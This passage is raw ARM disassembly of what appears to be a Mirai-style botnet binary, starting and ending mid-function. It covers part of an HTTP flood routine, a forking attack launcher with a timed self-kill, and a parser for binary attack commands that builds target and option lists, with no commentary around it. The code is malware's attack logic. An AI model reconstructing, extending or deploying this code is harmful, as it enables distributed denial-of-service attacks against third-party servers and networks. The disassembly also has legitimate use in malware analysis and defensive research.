    99fc:	eafffb7a 	b	87ec <attack_app_http+0x61c>
    9a00:	e3a0c007 	mov	ip, #7
    9a04:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    9a08:	e581c16c 	str	ip, [r1, #364]	; 0x16c
    9a0c:	e5d63004 	ldrb	r3, [r6, #4]
    9a10:	e3530073 	cmp	r3, #115	; 0x73
    9a14:	028cc001 	addeq	ip, ip, #1
    9a18:	0581c16c 	streq	ip, [r1, #364]	; 0x16c
    9a1c:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9a20:	e592116c 	ldr	r1, [r2, #364]	; 0x16c
    9a24:	e1a00006 	mov	r0, r6
    9a28:	e0612005 	rsb	r2, r1, r5
    9a2c:	e0861001 	add	r1, r6, r1
    9a30:	eb0033a2 	bl	168c0 <__GI_memmove>
    9a34:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9a38:	e583716c 	str	r7, [r3, #364]	; 0x16c
    9a3c:	e59de014 	ldr	lr, [sp, #20]
    9a40:	e7de0004 	ldrb	r0, [lr, r4]
    9a44:	e3500000 	cmp	r0, #0
    9a48:	0a00000e 	beq	9a88 <attack_app_http+0x18b8>
    9a4c:	e350002f 	cmp	r0, #47	; 0x2f
    9a50:	01a02006 	moveq	r2, r6
    9a54:	0a00003b 	beq	9b48 <attack_app_http+0x1978>
    9a58:	e1a01007 	mov	r1, r7
    9a5c:	ea000001 	b	9a68 <attack_app_http+0x1898>
    9a60:	e350002f 	cmp	r0, #47	; 0x2f
    9a64:	0a000037 	beq	9b48 <attack_app_http+0x1978>
    9a68:	e281c001 	add	ip, r1, #1
    9a6c:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9a70:	e582c16c 	str	ip, [r2, #364]	; 0x16c
    9a74:	e7dc0006 	ldrb	r0, [ip, r6]
    9a78:	e3500000 	cmp	r0, #0
    9a7c:	e1a0100c 	mov	r1, ip
    9a80:	e086200c 	add	r2, r6, ip
    9a84:	1afffff5 	bne	9a60 <attack_app_http+0x1890>
    9a88:	e1a00006 	mov	r0, r6
    9a8c:	eb002c25 	bl	14b28 <util_strlen>
    9a90:	e3500000 	cmp	r0, #0
    9a94:	da000006 	ble	9ab4 <attack_app_http+0x18e4>
    9a98:	e1a00006 	mov	r0, r6
    9a9c:	eb002c21 	bl	14b28 <util_strlen>
    9aa0:	e350007f 	cmp	r0, #127	; 0x7f
    9aa4:	d2890fc5 	addle	r0, r9, #788	; 0x314
    9aa8:	d2800001 	addle	r0, r0, #1
    9aac:	d1a01006 	movle	r1, r6
    9ab0:	db002c26 	blle	14b50 <util_strcpy>
    9ab4:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9ab8:	e593016c 	ldr	r0, [r3, #364]	; 0x16c
    9abc:	e2865001 	add	r5, r6, #1
    9ac0:	e0850000 	add	r0, r5, r0
    9ac4:	eb002c17 	bl	14b28 <util_strlen>
    9ac8:	e35000ff 	cmp	r0, #255	; 0xff
    9acc:	cafffee0 	bgt	9654 <attack_app_http+0x1484>
    9ad0:	e2894f85 	add	r4, r9, #532	; 0x214
    9ad4:	e2844001 	add	r4, r4, #1
    9ad8:	e1a00004 	mov	r0, r4
    9adc:	e3a010ff 	mov	r1, #255	; 0xff
    9ae0:	eb002c35 	bl	14bbc <util_zero>
    9ae4:	e28dca05 	add	ip, sp, #20480	; 0x5000
    9ae8:	e59c016c 	ldr	r0, [ip, #364]	; 0x16c
    9aec:	e0850000 	add	r0, r5, r0
    9af0:	eb002c0c 	bl	14b28 <util_strlen>
    9af4:	e3500000 	cmp	r0, #0
    9af8:	dafffed5 	ble	9654 <attack_app_http+0x1484>
    9afc:	e28dea05 	add	lr, sp, #20480	; 0x5000
    9b00:	e59e116c 	ldr	r1, [lr, #364]	; 0x16c
    9b04:	e1a00004 	mov	r0, r4
    9b08:	e0851001 	add	r1, r5, r1
    9b0c:	eb002c0f 	bl	14b50 <util_strcpy>
    9b10:	eafffecf 	b	9654 <attack_app_http+0x1484>
    9b14:	e1a00004 	mov	r0, r4
    9b18:	e51f1b04 	ldr	r1, [pc, #-2820]	; 901c <attack_app_http+0xe4c>
    9b1c:	eb002cf8 	bl	14f04 <util_strcmp>
    9b20:	e3500000 	cmp	r0, #0
    9b24:	1affff90 	bne	996c <attack_app_http+0x179c>
    9b28:	e15b0005 	cmp	fp, r5
    9b2c:	c3a0300a 	movgt	r3, #10
    9b30:	d3a03001 	movle	r3, #1
    9b34:	c54a35a8 	strbgt	r3, [sl, #-1448]	; 0xfffffa58
    9b38:	d54a35a8 	strble	r3, [sl, #-1448]	; 0xfffffa58
    9b3c:	eaffff8c 	b	9974 <attack_app_http+0x17a4>
    9b40:	e54a45a8 	strb	r4, [sl, #-1448]	; 0xfffffa58
    9b44:	eafffb28 	b	87ec <attack_app_http+0x61c>
    9b48:	e3a03000 	mov	r3, #0
    9b4c:	e5c23000 	strb	r3, [r2]
    9b50:	eaffffcc 	b	9a88 <attack_app_http+0x18b8>
    9b54:	e1a00006 	mov	r0, r6
    9b58:	eb002bf2 	bl	14b28 <util_strlen>
    9b5c:	e350007f 	cmp	r0, #127	; 0x7f
    9b60:	caffffa1 	bgt	99ec <attack_app_http+0x181c>
    9b64:	e59a0010 	ldr	r0, [sl, #16]
    9b68:	e1a00380 	lsl	r0, r0, #7
    9b6c:	e2800d17 	add	r0, r0, #1472	; 0x5c0
    9b70:	e1a01006 	mov	r1, r6
    9b74:	e0890000 	add	r0, r9, r0
    9b78:	eb002bf4 	bl	14b50 <util_strcpy>
    9b7c:	e59a4010 	ldr	r4, [sl, #16]
    9b80:	e1a04384 	lsl	r4, r4, #7
    9b84:	e2844d17 	add	r4, r4, #1472	; 0x5c0
    9b88:	e0894004 	add	r4, r9, r4
    9b8c:	e1a00004 	mov	r0, r4
    9b90:	eb002be4 	bl	14b28 <util_strlen>
    9b94:	e51f1b7c 	ldr	r1, [pc, #-2940]	; 9020 <attack_app_http+0xe50>
    9b98:	e0840000 	add	r0, r4, r0
    9b9c:	eb002beb 	bl	14b50 <util_strcpy>
    9ba0:	e2855003 	add	r5, r5, #3
    9ba4:	e59a1294 	ldr	r1, [sl, #660]	; 0x294
    9ba8:	e0876005 	add	r6, r7, r5
    9bac:	e0651001 	rsb	r1, r5, r1
    9bb0:	e1a03008 	mov	r3, r8
    9bb4:	e51f2b98 	ldr	r2, [pc, #-2968]	; 9024 <attack_app_http+0xe54>
    9bb8:	e1a00006 	mov	r0, r6
    9bbc:	eb002c07 	bl	14be0 <util_memsearch>
    9bc0:	e59a4010 	ldr	r4, [sl, #16]
    9bc4:	e1a04384 	lsl	r4, r4, #7
    9bc8:	e2844d17 	add	r4, r4, #1472	; 0x5c0
    9bcc:	e0895005 	add	r5, r9, r5
    9bd0:	e0894004 	add	r4, r9, r4
    9bd4:	e0855000 	add	r5, r5, r0
    9bd8:	e5c5b843 	strb	fp, [r5, #2115]	; 0x843
    9bdc:	e1a00004 	mov	r0, r4
    9be0:	eb002bd0 	bl	14b28 <util_strlen>
    9be4:	e1a01006 	mov	r1, r6
    9be8:	e0840000 	add	r0, r4, r0
    9bec:	eb002bd7 	bl	14b50 <util_strcpy>
    9bf0:	e59a3010 	ldr	r3, [sl, #16]
    9bf4:	e2833001 	add	r3, r3, #1
    9bf8:	e58a3010 	str	r3, [sl, #16]
    9bfc:	eaffff7a 	b	99ec <attack_app_http+0x181c>
    9c00:	e2894f85 	add	r4, r9, #532	; 0x214
    9c04:	e2844001 	add	r4, r4, #1
    9c08:	e1a00004 	mov	r0, r4
    9c0c:	e3a010ff 	mov	r1, #255	; 0xff
    9c10:	eb002be9 	bl	14bbc <util_zero>
    9c14:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9c18:	e592016c 	ldr	r0, [r2, #364]	; 0x16c
    9c1c:	e2866001 	add	r6, r6, #1
    9c20:	e0860000 	add	r0, r6, r0
    9c24:	eb002bbf 	bl	14b28 <util_strlen>
    9c28:	e3500000 	cmp	r0, #0
    9c2c:	dafffe88 	ble	9654 <attack_app_http+0x1484>
    9c30:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9c34:	e593016c 	ldr	r0, [r3, #364]	; 0x16c
    9c38:	e0860000 	add	r0, r6, r0
    9c3c:	eb002bb9 	bl	14b28 <util_strlen>
    9c40:	e35000ff 	cmp	r0, #255	; 0xff
    9c44:	cafffe82 	bgt	9654 <attack_app_http+0x1484>
    9c48:	e28dca05 	add	ip, sp, #20480	; 0x5000
    9c4c:	e59c116c 	ldr	r1, [ip, #364]	; 0x16c
    9c50:	e1a00004 	mov	r0, r4
    9c54:	e0861001 	add	r1, r6, r1
    9c58:	eb002bbc 	bl	14b50 <util_strcpy>
    9c5c:	eafffe7c 	b	9654 <attack_app_http+0x1484>
    9c60:	e3a0c007 	mov	ip, #7
    9c64:	e28dea05 	add	lr, sp, #20480	; 0x5000
    9c68:	e58ec16c 	str	ip, [lr, #364]	; 0x16c
    9c6c:	e5d63004 	ldrb	r3, [r6, #4]
    9c70:	e3530073 	cmp	r3, #115	; 0x73
    9c74:	028cc001 	addeq	ip, ip, #1
    9c78:	058ec16c 	streq	ip, [lr, #364]	; 0x16c
    9c7c:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9c80:	e592116c 	ldr	r1, [r2, #364]	; 0x16c
    9c84:	e2612001 	rsb	r2, r1, #1
    9c88:	e0822007 	add	r2, r2, r7
    9c8c:	e0861001 	add	r1, r6, r1
    9c90:	e1a00006 	mov	r0, r6
    9c94:	eb003309 	bl	168c0 <__GI_memmove>
    9c98:	e3a0c000 	mov	ip, #0
    9c9c:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9ca0:	e583c16c 	str	ip, [r3, #364]	; 0x16c
    9ca4:	e7d50004 	ldrb	r0, [r5, r4]
    9ca8:	e150000c 	cmp	r0, ip
    9cac:	0a00000d 	beq	9ce8 <attack_app_http+0x1b18>
    9cb0:	e350002f 	cmp	r0, #47	; 0x2f
    9cb4:	01a02006 	moveq	r2, r6
    9cb8:	0a00002a 	beq	9d68 <attack_app_http+0x1b98>
    9cbc:	e1a0100c 	mov	r1, ip
    9cc0:	ea000001 	b	9ccc <attack_app_http+0x1afc>
    9cc4:	e350002f 	cmp	r0, #47	; 0x2f
    9cc8:	0a000026 	beq	9d68 <attack_app_http+0x1b98>
    9ccc:	e2811001 	add	r1, r1, #1
    9cd0:	e28dca05 	add	ip, sp, #20480	; 0x5000
    9cd4:	e58c116c 	str	r1, [ip, #364]	; 0x16c
    9cd8:	e7d10006 	ldrb	r0, [r1, r6]
    9cdc:	e3500000 	cmp	r0, #0
    9ce0:	e0862001 	add	r2, r6, r1
    9ce4:	1afffff6 	bne	9cc4 <attack_app_http+0x1af4>
    9ce8:	e1a00006 	mov	r0, r6
    9cec:	eb002b8d 	bl	14b28 <util_strlen>
    9cf0:	e3500000 	cmp	r0, #0
    9cf4:	da000003 	ble	9d08 <attack_app_http+0x1b38>
    9cf8:	e1a00006 	mov	r0, r6
    9cfc:	eb002b89 	bl	14b28 <util_strlen>
    9d00:	e350007f 	cmp	r0, #127	; 0x7f
    9d04:	da00006f 	ble	9ec8 <attack_app_http+0x1cf8>
    9d08:	e28dea05 	add	lr, sp, #20480	; 0x5000
    9d0c:	e59e016c 	ldr	r0, [lr, #364]	; 0x16c
    9d10:	e2865001 	add	r5, r6, #1
    9d14:	e0850000 	add	r0, r5, r0
    9d18:	eb002b82 	bl	14b28 <util_strlen>
    9d1c:	e35000ff 	cmp	r0, #255	; 0xff
    9d20:	cafffefc 	bgt	9918 <attack_app_http+0x1748>
    9d24:	e2894f85 	add	r4, r9, #532	; 0x214
    9d28:	e2844001 	add	r4, r4, #1
    9d2c:	e1a00004 	mov	r0, r4
    9d30:	e3a010ff 	mov	r1, #255	; 0xff
    9d34:	eb002ba0 	bl	14bbc <util_zero>
    9d38:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    9d3c:	e591016c 	ldr	r0, [r1, #364]	; 0x16c
    9d40:	e0850000 	add	r0, r5, r0
    9d44:	eb002b77 	bl	14b28 <util_strlen>
    9d48:	e3500000 	cmp	r0, #0
    9d4c:	dafffef1 	ble	9918 <attack_app_http+0x1748>
    9d50:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9d54:	e592116c 	ldr	r1, [r2, #364]	; 0x16c
    9d58:	e1a00004 	mov	r0, r4
    9d5c:	e0851001 	add	r1, r5, r1
    9d60:	eb002b7a 	bl	14b50 <util_strcpy>
    9d64:	eafffeeb 	b	9918 <attack_app_http+0x1748>
    9d68:	e3a03000 	mov	r3, #0
    9d6c:	e5c23000 	strb	r3, [r2]
    9d70:	eaffffdc 	b	9ce8 <attack_app_http+0x1b18>
    9d74:	e28cc001 	add	ip, ip, #1
    9d78:	e085400c 	add	r4, r5, ip
    9d7c:	e28dea05 	add	lr, sp, #20480	; 0x5000
    9d80:	e1a00004 	mov	r0, r4
    9d84:	e58ec16c 	str	ip, [lr, #364]	; 0x16c
    9d88:	eb002b66 	bl	14b28 <util_strlen>
    9d8c:	e0844000 	add	r4, r4, r0
    9d90:	e5543001 	ldrb	r3, [r4, #-1]
    9d94:	e3530022 	cmp	r3, #34	; 0x22
    9d98:	1afffec1 	bne	98a4 <attack_app_http+0x16d4>
    9d9c:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    9da0:	e591416c 	ldr	r4, [r1, #364]	; 0x16c
    9da4:	e0854004 	add	r4, r5, r4
    9da8:	e1a00004 	mov	r0, r4
    9dac:	eb002b5d 	bl	14b28 <util_strlen>
    9db0:	e0844000 	add	r4, r4, r0
    9db4:	e5446001 	strb	r6, [r4, #-1]
    9db8:	eafffeb9 	b	98a4 <attack_app_http+0x16d4>
    9dbc:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9dc0:	e593016c 	ldr	r0, [r3, #364]	; 0x16c
    9dc4:	e2865001 	add	r5, r6, #1
    9dc8:	e0850000 	add	r0, r5, r0
    9dcc:	eb002b55 	bl	14b28 <util_strlen>
    9dd0:	e35000ff 	cmp	r0, #255	; 0xff
    9dd4:	cafffecf 	bgt	9918 <attack_app_http+0x1748>
    9dd8:	e2894f85 	add	r4, r9, #532	; 0x214
    9ddc:	e2844001 	add	r4, r4, #1
    9de0:	e1a00004 	mov	r0, r4
    9de4:	e3a010ff 	mov	r1, #255	; 0xff
    9de8:	eb002b73 	bl	14bbc <util_zero>
    9dec:	e28dca05 	add	ip, sp, #20480	; 0x5000
    9df0:	e59c016c 	ldr	r0, [ip, #364]	; 0x16c
    9df4:	e0850000 	add	r0, r5, r0
    9df8:	eb002b4a 	bl	14b28 <util_strlen>
    9dfc:	e3500000 	cmp	r0, #0
    9e00:	dafffec4 	ble	9918 <attack_app_http+0x1748>
    9e04:	e28dea05 	add	lr, sp, #20480	; 0x5000
    9e08:	e59e116c 	ldr	r1, [lr, #364]	; 0x16c
    9e0c:	e1a00004 	mov	r0, r4
    9e10:	e0851001 	add	r1, r5, r1
    9e14:	eb002b4d 	bl	14b50 <util_strcpy>
    9e18:	eafffebe 	b	9918 <attack_app_http+0x1748>
    9e1c:	e3a0004b 	mov	r0, #75	; 0x4b
    9e20:	eb0025be 	bl	13520 <table_unlock_val>
    9e24:	e3a01000 	mov	r1, #0
    9e28:	e3a0004b 	mov	r0, #75	; 0x4b
    9e2c:	eb00258a 	bl	1345c <table_retrieve_val>
    9e30:	e1a01000 	mov	r1, r0
    9e34:	e2850014 	add	r0, r5, #20
    9e38:	eb002b44 	bl	14b50 <util_strcpy>
    9e3c:	e3a0004b 	mov	r0, #75	; 0x4b
    9e40:	eb00258e 	bl	13480 <table_lock_val>
    9e44:	e59d0030 	ldr	r0, [sp, #48]	; 0x30
    9e48:	e1a01008 	mov	r1, r8
    9e4c:	eb002b3f 	bl	14b50 <util_strcpy>
    9e50:	e59d2040 	ldr	r2, [sp, #64]	; 0x40
    9e54:	e28bb001 	add	fp, fp, #1
    9e58:	e2855d31 	add	r5, r5, #3136	; 0xc40
    9e5c:	e15b0002 	cmp	fp, r2
    9e60:	e2855004 	add	r5, r5, #4
    9e64:	1afff958 	bne	83cc <attack_app_http+0x1fc>
    9e68:	e59d3024 	ldr	r3, [sp, #36]	; 0x24
    9e6c:	e28dcda1 	add	ip, sp, #10304	; 0x2840
    9e70:	e2833e5a 	add	r3, r3, #1440	; 0x5a0
    9e74:	e28cc030 	add	ip, ip, #48	; 0x30
    9e78:	e1a0e427 	lsr	lr, r7, #8
    9e7c:	e283300c 	add	r3, r3, #12
    9e80:	e24cc024 	sub	ip, ip, #36	; 0x24
    9e84:	e20770ff 	and	r7, r7, #255	; 0xff
    9e88:	e58d3010 	str	r3, [sp, #16]
    9e8c:	e58de018 	str	lr, [sp, #24]
    9e90:	e58dc01c 	str	ip, [sp, #28]
    9e94:	e58d700c 	str	r7, [sp, #12]
    9e98:	eafff9a3 	b	852c <attack_app_http+0x35c>
    9e9c:	e3a0004c 	mov	r0, #76	; 0x4c
    9ea0:	eb00259e 	bl	13520 <table_unlock_val>
    9ea4:	e3a01000 	mov	r1, #0
    9ea8:	e3a0004c 	mov	r0, #76	; 0x4c
    9eac:	eb00256a 	bl	1345c <table_retrieve_val>
    9eb0:	e1a01000 	mov	r1, r0
    9eb4:	e2850014 	add	r0, r5, #20
    9eb8:	eb002b24 	bl	14b50 <util_strcpy>
    9ebc:	e3a0004c 	mov	r0, #76	; 0x4c
    9ec0:	eb00256e 	bl	13480 <table_lock_val>
    9ec4:	eaffffde 	b	9e44 <attack_app_http+0x1c74>
    9ec8:	e2890fc5 	add	r0, r9, #788	; 0x314
    9ecc:	e1a01006 	mov	r1, r6
    9ed0:	e2800001 	add	r0, r0, #1
    9ed4:	eb002b1d 	bl	14b50 <util_strcpy>
    9ed8:	eaffff8a 	b	9d08 <attack_app_http+0x1b38>
    9edc:	e3a00049 	mov	r0, #73	; 0x49
    9ee0:	eb00258e 	bl	13520 <table_unlock_val>
    9ee4:	e3a01000 	mov	r1, #0
    9ee8:	e3a00049 	mov	r0, #73	; 0x49
    9eec:	eb00255a 	bl	1345c <table_retrieve_val>
    9ef0:	e1a01000 	mov	r1, r0
    9ef4:	e2850014 	add	r0, r5, #20
    9ef8:	eb002b14 	bl	14b50 <util_strcpy>
    9efc:	e3a00049 	mov	r0, #73	; 0x49
    9f00:	eb00255e 	bl	13480 <table_lock_val>
    9f04:	eaffffce 	b	9e44 <attack_app_http+0x1c74>
    9f08:	e3a00048 	mov	r0, #72	; 0x48
    9f0c:	eb002583 	bl	13520 <table_unlock_val>
    9f10:	e3a01000 	mov	r1, #0
    9f14:	e3a00048 	mov	r0, #72	; 0x48
    9f18:	eb00254f 	bl	1345c <table_retrieve_val>
    9f1c:	e1a01000 	mov	r1, r0
    9f20:	e2850014 	add	r0, r5, #20
    9f24:	eb002b09 	bl	14b50 <util_strcpy>
    9f28:	e3a00048 	mov	r0, #72	; 0x48
    9f2c:	eb002553 	bl	13480 <table_lock_val>
    9f30:	eaffffc3 	b	9e44 <attack_app_http+0x1c74>
    9f34:	e3a0004a 	mov	r0, #74	; 0x4a
    9f38:	eb002578 	bl	13520 <table_unlock_val>
    9f3c:	e3a01000 	mov	r1, #0
    9f40:	e3a0004a 	mov	r0, #74	; 0x4a
    9f44:	eb002544 	bl	1345c <table_retrieve_val>
    9f48:	e1a01000 	mov	r1, r0
    9f4c:	e2850014 	add	r0, r5, #20
    9f50:	eb002afe 	bl	14b50 <util_strcpy>
    9f54:	e3a0004a 	mov	r0, #74	; 0x4a
    9f58:	eb002548 	bl	13480 <table_lock_val>
    9f5c:	eaffffb8 	b	9e44 <attack_app_http+0x1c74>

00009f60 <attack_get_opt_str>:
    9f60:	e3500000 	cmp	r0, #0
    9f64:	e92d4010 	push	{r4, lr}
    9f68:	e1a04003 	mov	r4, r3
    9f6c:	0a00000d 	beq	9fa8 <attack_get_opt_str+0x48>
    9f70:	e5d13004 	ldrb	r3, [r1, #4]
    9f74:	e1530002 	cmp	r3, r2
    9f78:	1281c008 	addne	ip, r1, #8
    9f7c:	13a0e000 	movne	lr, #0
    9f80:	1a000004 	bne	9f98 <attack_get_opt_str+0x38>
    9f84:	ea00000a 	b	9fb4 <attack_get_opt_str+0x54>
    9f88:	e5dc3004 	ldrb	r3, [ip, #4]
    9f8c:	e1530002 	cmp	r3, r2
    9f90:	e28cc008 	add	ip, ip, #8
    9f94:	0a000006 	beq	9fb4 <attack_get_opt_str+0x54>
    9f98:	e28ee001 	add	lr, lr, #1
    9f9c:	e150000e 	cmp	r0, lr
    9fa0:	e1a0100c 	mov	r1, ip
    9fa4:	1afffff7 	bne	9f88 <attack_get_opt_str+0x28>
    9fa8:	e1a00004 	mov	r0, r4
    9fac:	e8bd4010 	pop	{r4, lr}
    9fb0:	e12fff1e 	bx	lr
    9fb4:	e5914000 	ldr	r4, [r1]
    9fb8:	eafffffa 	b	9fa8 <attack_get_opt_str+0x48>

00009fbc <attack_start>:
    9fbc:	e92d47f0 	push	{r4, r5, r6, r7, r8, r9, sl, lr}
    9fc0:	e1a09003 	mov	r9, r3
    9fc4:	e1a06000 	mov	r6, r0
    9fc8:	e1a07001 	mov	r7, r1
    9fcc:	e1a0a002 	mov	sl, r2
    9fd0:	e5dd8020 	ldrb	r8, [sp, #32]
    9fd4:	eb003ddd 	bl	19750 <__libc_fork>
    9fd8:	e3700001 	cmn	r0, #1
    9fdc:	13a03000 	movne	r3, #0
    9fe0:	03a03001 	moveq	r3, #1
    9fe4:	e3500000 	cmp	r0, #0
    9fe8:	d1a05003 	movle	r5, r3
    9fec:	c3835001 	orrgt	r5, r3, #1
    9ff0:	e3550000 	cmp	r5, #0
    9ff4:	0a000001 	beq	a000 <attack_start+0x44>
    9ff8:	e8bd47f0 	pop	{r4, r5, r6, r7, r8, r9, sl, lr}
    9ffc:	e12fff1e 	bx	lr
    a000:	eb003dd2 	bl	19750 <__libc_fork>
    a004:	e3700001 	cmn	r0, #1
    a008:	e1a04000 	mov	r4, r0
    a00c:	0a000008 	beq	a034 <attack_start+0x78>
    a010:	e3500000 	cmp	r0, #0
    a014:	1a000008 	bne	a03c <attack_start+0x80>
    a018:	e1a00006 	mov	r0, r6
    a01c:	eb003f32 	bl	19cec <__GI_sleep>
    a020:	eb003020 	bl	160a8 <getppid>
    a024:	e3a01009 	mov	r1, #9
    a028:	eb00305b 	bl	1619c <__GI_kill>
    a02c:	e1a00004 	mov	r0, r4
    a030:	eb003bb9 	bl	18f1c <__GI_exit>
    a034:	e1a00005 	mov	r0, r5
    a038:	eb003bb7 	bl	18f1c <__GI_exit>
    a03c:	e59f306c 	ldr	r3, [pc, #108]	; a0b0 <attack_start+0xf4>
    a040:	e5d31000 	ldrb	r1, [r3]
    a044:	e3510000 	cmp	r1, #0
    a048:	0a00000e 	beq	a088 <attack_start+0xcc>
    a04c:	e59f3060 	ldr	r3, [pc, #96]	; a0b4 <attack_start+0xf8>
    a050:	e5932000 	ldr	r2, [r3]
    a054:	e592c000 	ldr	ip, [r2]
    a058:	e5dc3004 	ldrb	r3, [ip, #4]
    a05c:	e1530007 	cmp	r3, r7
    a060:	11a00005 	movne	r0, r5
    a064:	1a000004 	bne	a07c <attack_start+0xc0>
    a068:	ea000008 	b	a090 <attack_start+0xd4>
    a06c:	e792c100 	ldr	ip, [r2, r0, lsl #2]
    a070:	e5dc3004 	ldrb	r3, [ip, #4]
    a074:	e1530007 	cmp	r3, r7
    a078:	0a000004 	beq	a090 <attack_start+0xd4>
    a07c:	e2800001 	add	r0, r0, #1
    a080:	e1500001 	cmp	r0, r1
    a084:	1afffff8 	bne	a06c <attack_start+0xb0>
    a088:	e3a00000 	mov	r0, #0
    a08c:	eb003ba2 	bl	18f1c <__GI_exit>
    a090:	e1a0000a 	mov	r0, sl
    a094:	e1a01009 	mov	r1, r9
    a098:	e1a02008 	mov	r2, r8
    a09c:	e59d3024 	ldr	r3, [sp, #36]	; 0x24
    a0a0:	e59cc000 	ldr	ip, [ip]
    a0a4:	e1a0e00f 	mov	lr, pc
    a0a8:	e12fff1c 	bx	ip
    a0ac:	eafffff5 	b	a088 <attack_start+0xcc>
    a0b0:	00028c88 	.word	0x00028c88
    a0b4:	00028c8c 	.word	0x00028c8c

0000a0b8 <attack_parse>:
    a0b8:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    a0bc:	e3510003 	cmp	r1, #3
    a0c0:	e24dd01c 	sub	sp, sp, #28
    a0c4:	e1a04001 	mov	r4, r1
    a0c8:	e1a05000 	mov	r5, r0
    a0cc:	8a000002 	bhi	a0dc <attack_parse+0x24>
    a0d0:	e28dd01c 	add	sp, sp, #28
    a0d4:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    a0d8:	e12fff1e 	bx	lr
    a0dc:	e5901000 	ldr	r1, [r0]
    a0e0:	e20108ff 	and	r0, r1, #16711680	; 0xff0000
    a0e4:	e1a03c21 	lsr	r3, r1, #24
    a0e8:	e1833420 	orr	r3, r3, r0, lsr #8
    a0ec:	e2012cff 	and	r2, r1, #65280	; 0xff00
    a0f0:	e1833402 	orr	r3, r3, r2, lsl #8
    a0f4:	e3540004 	cmp	r4, #4
    a0f8:	e183bc01 	orr	fp, r3, r1, lsl #24
    a0fc:	0afffff3 	beq	a0d0 <attack_parse+0x18>
    a100:	e5d52004 	ldrb	r2, [r5, #4]
    a104:	e3540005 	cmp	r4, #5
    a108:	e58d2014 	str	r2, [sp, #20]
    a10c:	0affffef 	beq	a0d0 <attack_parse+0x18>
    a110:	e5d59005 	ldrb	r9, [r5, #5]
    a114:	e3590000 	cmp	r9, #0
    a118:	0affffec 	beq	a0d0 <attack_parse+0x18>
    a11c:	e1a03109 	lsl	r3, r9, #2
    a120:	e0837009 	add	r7, r3, r9
    a124:	e2443006 	sub	r3, r4, #6
    a128:	e1530007 	cmp	r3, r7
    a12c:	3affffe7 	bcc	a0d0 <attack_parse+0x18>
    a130:	e1a00009 	mov	r0, r9
    a134:	e3a01018 	mov	r1, #24
    a138:	e1a06003 	mov	r6, r3
    a13c:	eb0036a6 	bl	17bdc <calloc>
    a140:	e58d000c 	str	r0, [sp, #12]
    a144:	e59dc00c 	ldr	ip, [sp, #12]
    a148:	e0677004 	rsb	r7, r7, r4
    a14c:	e285000b 	add	r0, r5, #11
    a150:	e5101005 	ldr	r1, [r0, #-5]
    a154:	e58c1010 	str	r1, [ip, #16]
    a158:	e2473006 	sub	r3, r7, #6
    a15c:	e5502001 	ldrb	r2, [r0, #-1]
    a160:	e2466005 	sub	r6, r6, #5
    a164:	e1560003 	cmp	r6, r3
    a168:	e3a03002 	mov	r3, #2
    a16c:	e1a04000 	mov	r4, r0
    a170:	e5cc2014 	strb	r2, [ip, #20]
    a174:	e58c1004 	str	r1, [ip, #4]
    a178:	e1cc30b0 	strh	r3, [ip]
    a17c:	e2800005 	add	r0, r0, #5
    a180:	e28cc018 	add	ip, ip, #24
    a184:	1afffff1 	bne	a150 <attack_parse+0x98>
    a188:	e3560000 	cmp	r6, #0
    a18c:	0a00003e 	beq	a28c <attack_parse+0x1d4>
    a190:	e5d45000 	ldrb	r5, [r4]
    a194:	e3550000 	cmp	r5, #0
    a198:	e2478007 	sub	r8, r7, #7
    a19c:	01a06005 	moveq	r6, r5
    a1a0:	0a000030 	beq	a268 <attack_parse+0x1b0>
    a1a4:	e1a00005 	mov	r0, r5
    a1a8:	e3a01008 	mov	r1, #8
    a1ac:	eb00368a 	bl	17bdc <calloc>
    a1b0:	e3580000 	cmp	r8, #0
    a1b4:	e1a06000 	mov	r6, r0
    a1b8:	0a000033 	beq	a28c <attack_parse+0x1d4>
    a1bc:	e5d43001 	ldrb	r3, [r4, #1]
    a1c0:	e3570008 	cmp	r7, #8
    a1c4:	e5c03004 	strb	r3, [r0, #4]
    a1c8:	e2843001 	add	r3, r4, #1
    a1cc:	0a00002e 	beq	a28c <attack_parse+0x1d4>
    a1d0:	e5d34001 	ldrb	r4, [r3, #1]
    a1d4:	e2478009 	sub	r8, r7, #9
    a1d8:	e1580004 	cmp	r8, r4
    a1dc:	e2831001 	add	r1, r3, #1
    a1e0:	a3a02000 	movge	r2, #0
    a1e4:	a2817001 	addge	r7, r1, #1
    a1e8:	a1a0a000 	movge	sl, r0
    a1ec:	a58d2010 	strge	r2, [sp, #16]
    a1f0:	aa00000d 	bge	a22c <attack_parse+0x174>
    a1f4:	ea000024 	b	a28c <attack_parse+0x1d4>
    a1f8:	e0582004 	subs	r2, r8, r4
    a1fc:	0a000022 	beq	a28c <attack_parse+0x1d4>
    a200:	e7d43007 	ldrb	r3, [r4, r7]
    a204:	e0840007 	add	r0, r4, r7
    a208:	e2522001 	subs	r2, r2, #1
    a20c:	e5ca3004 	strb	r3, [sl, #4]
    a210:	e2803001 	add	r3, r0, #1
    a214:	e2428001 	sub	r8, r2, #1
    a218:	e2837001 	add	r7, r3, #1
    a21c:	0a00001a 	beq	a28c <attack_parse+0x1d4>
    a220:	e5d04001 	ldrb	r4, [r0, #1]
    a224:	e1580004 	cmp	r8, r4
    a228:	ba000017 	blt	a28c <attack_parse+0x1d4>
    a22c:	e3a01001 	mov	r1, #1
    a230:	e2840001 	add	r0, r4, #1
    a234:	eb003668 	bl	17bdc <calloc>
    a238:	e59d3010 	ldr	r3, [sp, #16]
    a23c:	e58a0000 	str	r0, [sl]
    a240:	e2833001 	add	r3, r3, #1
    a244:	e1a02004 	mov	r2, r4
    a248:	e1a01007 	mov	r1, r7
    a24c:	e58d3010 	str	r3, [sp, #16]
    a250:	eb002a50 	bl	14b98 <util_memcpy>
    a254:	e59d2010 	ldr	r2, [sp, #16]
    a258:	e1a03182 	lsl	r3, r2, #3
